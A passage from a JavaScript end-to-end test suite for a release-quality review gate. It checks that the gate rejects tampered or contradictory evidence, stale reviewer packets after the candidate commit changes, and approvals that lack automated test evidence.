      assertEqual(sensitivePacket.stdout.includes(secretCanary), false, 'Gate diagnostics must not echo detected secrets');
      writeFileSync(improvementPath, improvementContent);

      writeFileSync(join(round, 'evidence', 'automated-checks.json'), `${automatedContent} `);
      const substituted = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      // With fallback logic, invalid evidence triggers re-collection instead of fail-closed
      assertTrue(substituted.stdout.includes('Persisted evidence is invalid') || substituted.stdout.includes('Re-collecting'),
        'Expected evidence invalid warning or re-collection message');

      const contradictory = JSON.parse(automatedContent);
      contradictory.testGate.exit_code = 1;
      const contradictoryContent = JSON.stringify(contradictory);
      writeFileSync(join(round, 'evidence', 'automated-checks.json'), contradictoryContent);
      const reboundMetadata = JSON.parse(readFileSync(join(round, 'metadata.json'), 'utf8'));
      reboundMetadata.automated_checks_sha256 = createHash('sha256').update(contradictoryContent).digest('hex');
      writeFileSync(join(round, 'metadata.json'), JSON.stringify(reboundMetadata));
      const contradictoryResult = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(contradictoryResult.status, 1);
      assertTrue(contradictoryResult.stdout.includes('invalid testGate command evidence'), 'Expected pass/nonzero contradiction to fail closed');

      const alteredCheckout = JSON.parse(automatedContent);
      alteredCheckout.candidateCheckout.final.status = ' M package.json';
      const alteredCheckoutContent = JSON.stringify(alteredCheckout);
      writeFileSync(join(round, 'evidence', 'automated-checks.json'), alteredCheckoutContent);
      reboundMetadata.automated_checks_sha256 = createHash('sha256').update(alteredCheckoutContent).digest('hex');
      writeFileSync(join(round, 'metadata.json'), JSON.stringify(reboundMetadata));
      const alteredCheckoutResult = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(alteredCheckoutResult.status, 1);
      assertTrue(alteredCheckoutResult.stdout.includes('invalid automated verification checkout evidence'),
        'Expected altered checkout identity to fail closed');
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });

  test('E2E rejects stale reviewer packets when the candidate changes in the same round', () => {
    const cloneRoot = join(TEST_DIR, 'candidate-drift-clone');
    const roundNumber = 991;
    const round = join(cloneRoot, 'quality-reports', `round-${String(roundNumber).padStart(3, '0')}`);
    try {
      const cloned = spawnSync('git', ['clone', '--quiet', '--no-local', PROJECT_ROOT, cloneRoot], {
        cwd: TEST_DIR, encoding: 'utf8', timeout: 30000,
      });
      assertEqual(cloned.status, 0, `Expected fixture clone, output: ${cloned.stdout}${cloned.stderr}`);
      spawnSync('git', ['config', 'user.email', 'review-test@example.invalid'], { cwd: cloneRoot });
      spawnSync('git', ['config', 'user.name', 'Review Test'], { cwd: cloneRoot });

      for (const relativePath of [
        'skills/release-quality-review/scripts/review-gate.mjs',
        'skills/release-quality-review/scripts/evidence-validator.mjs',
        'skills/release-quality-review/lib/review-utils.mjs',
        'skills/release-quality-review/lib/evidence-utils.mjs',
        'skills/release-quality-review/lib/candidate-runtime.mjs',
        'skills/release-quality-review/review-config.yaml',
        'skills/release-quality-review/templates/result.yaml',
      ]) {
        copyFileSync(join(PROJECT_ROOT, relativePath), join(cloneRoot, relativePath));
      }
      cpSync(join(PROJECT_ROOT, 'skills/release-quality-review/scripts/modules'), join(cloneRoot, 'skills/release-quality-review/scripts/modules'), { recursive: true });

      const packagePath = join(cloneRoot, 'package.json');
      const packageJson = JSON.parse(readFileSync(packagePath, 'utf8'));
      for (const script of ['test', 'typecheck', 'build', 'lint', 'coverage']) {
        packageJson.scripts[script] = 'node --check skills/release-quality-review/scripts/review-gate.mjs';
      }
      packageJson.scripts['test:e2e'] = 'node --test fixture-test-runner.mjs';
      packageJson.scripts.test = 'node --test fixture-test-runner.mjs';
      packageJson.scripts.coverage = 'node --experimental-test-coverage --test fixture-test-runner.mjs';
      writeFileSync(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`);
      writeFileSync(join(cloneRoot, 'fixture-test-runner.mjs'),
        "import test from 'node:test';\ntest('fixture runner executes', () => {});\n");
      spawnSync('git', ['add', 'package.json', 'fixture-test-runner.mjs', 'skills/release-quality-review'], { cwd: cloneRoot });
      const fixtureCommit = spawnSync('git', ['commit', '-m', 'test: create fast gate fixture'], {
        cwd: cloneRoot, encoding: 'utf8', timeout: 10000,
      });
      assertEqual(fixtureCommit.status, 0, `Expected fixture commit, output: ${fixtureCommit.stdout}${fixtureCommit.stderr}`);

      const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: cloneRoot, encoding: 'utf8' }).stdout.trim();
      const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: cloneRoot, encoding: 'utf8' }).stdout.trim();
      const diffBase = spawnSync('git', ['rev-parse', 'HEAD^'], { cwd: cloneRoot, encoding: 'utf8' }).stdout.trim();
      for (const reviewer of ['product-flow', 'architecture-maintainer']) {
        const dir = join(round, reviewer);
        mkdirSync(dir, { recursive: true });
        writeFileSync(join(dir, 'result.yaml'), `reviewer: ${reviewer}\nprofile: quick\nround: ${roundNumber}\ncandidate_commit: ${candidateCommit}\ncandidate_tree: ${candidateTree}\nscore: 95\nstatus: pass\nblockers: []\nredlines: []\n`);
        writeFileSync(join(dir, 'score.md'), `# ${reviewer}\n\n## Overall Score: 95/100\n\nEvidence: package.json:1 and npm test exit 0.\n`);
        writeFileSync(join(dir, 'blockers.md'), '# Blockers\n\nNo P0/P1 blockers.\n');
        writeFileSync(join(dir, 'improvement-list.md'), '# Improvements\n');
      }

      const fixtureEnv = { ...process.env, RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED: '1' };
      delete fixtureEnv.NODE_TEST_CONTEXT;

      const firstGate = spawnSync('node', [
        join(cloneRoot, 'skills/release-quality-review/scripts/review-gate.mjs'), '--profile', 'quick',
        '--round', String(roundNumber), '--base', diffBase, '--no-validate-evidence',
      ], { cwd: cloneRoot, encoding: 'utf8', timeout: 60000, env: fixtureEnv });
      assertEqual(firstGate.status, 0, `Expected candidate A to pass, output: ${firstGate.stdout}${firstGate.stderr}`);
      const arbitration = JSON.parse(readFileSync(join(round, 'evidence', 'final-arbitration.json'), 'utf8'));
      assertEqual(arbitration.candidate_commit, candidateCommit);
      assertEqual(arbitration.candidate_tree, candidateTree);
      assertEqual(Object.keys(arbitration.reviewer_packet_sha256).length, 2);

      writeFileSync(join(cloneRoot, 'README.md'), `${readFileSync(join(cloneRoot, 'README.md'), 'utf8')}\ncandidate B\n`);
      spawnSync('git', ['add', 'README.md'], { cwd: cloneRoot });
      const secondCommit = spawnSync('git', ['commit', '-m', 'test: change candidate'], {
        cwd: cloneRoot, encoding: 'utf8', timeout: 10000,
      });
      assertEqual(secondCommit.status, 0, `Expected candidate B commit, output: ${secondCommit.stdout}${secondCommit.stderr}`);

      const staleGate = spawnSync('node', [
        join(cloneRoot, 'skills/release-quality-review/scripts/review-gate.mjs'), '--profile', 'quick',
        '--round', String(roundNumber), '--base', diffBase, '--no-validate-evidence',
      ], { cwd: cloneRoot, encoding: 'utf8', timeout: 60000, env: fixtureEnv });
      assertEqual(staleGate.status, 1, `Expected stale packets to fail, output: ${staleGate.stdout}${staleGate.stderr}`);
      assertTrue(staleGate.stdout.includes('candidate identity'), 'Expected explicit candidate identity diagnostic');
    } finally {
      rmSync(cloneRoot, { recursive: true, force: true });
    }
  });

  test('quick profile cannot approve without automated test and typecheck evidence', () => {
    const roundNumber = TEST_ROUNDS.missingEvidence;
    const round = reportRound(roundNumber);
    const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
    try {
      for (const reviewer of ['product-flow', 'architecture-maintainer']) {
        const dir = join(round, reviewer);
        mkdirSync(dir, { recursive: true });
        writeFileSync(join(dir, 'result.yaml'), `reviewer: ${reviewer}\nprofile: quick\nround: ${roundNumber}\ncandidate_commit: ${candidateCommit}\ncandidate_tree: ${candidateTree}\nscore: 95\nstatus: pass\nblockers: []\nredlines: []\n`);
        writeFileSync(join(dir, 'score.md'), `## Overall Score: 95/100\n`);
        writeFileSync(join(dir, 'blockers.md'), 'No P0/P1 blockers.\n');
        writeFileSync(join(dir, 'improvement-list.md'), '# Improvements\n');
      }
      const result = spawnSync('node', [
        join(SKILL_DIR, 'scripts', 'review-gate.mjs'), '--profile', 'quick', '--round', String(roundNumber),
        '--no-collect', '--no-validate-evidence',
      ], { cwd: PROJECT_ROOT, encoding: 'utf8' });
      assertEqual(result.status, 1);
      assertTrue(result.stdout.includes('Automated test gate FAILED'), 'Expected absent automated evidence to fail closed');
    } finally {
      rmSync(round, { recursive: true, force: true });
    }
  });
});

// Cleanup after all tests
process.on('exit', () => {
  try {
    rmSync(TEST_DIR, { recursive: true });
    rmdirSync(TEST_ROOT);
  } catch (e) {
    // Ignore
  }
});
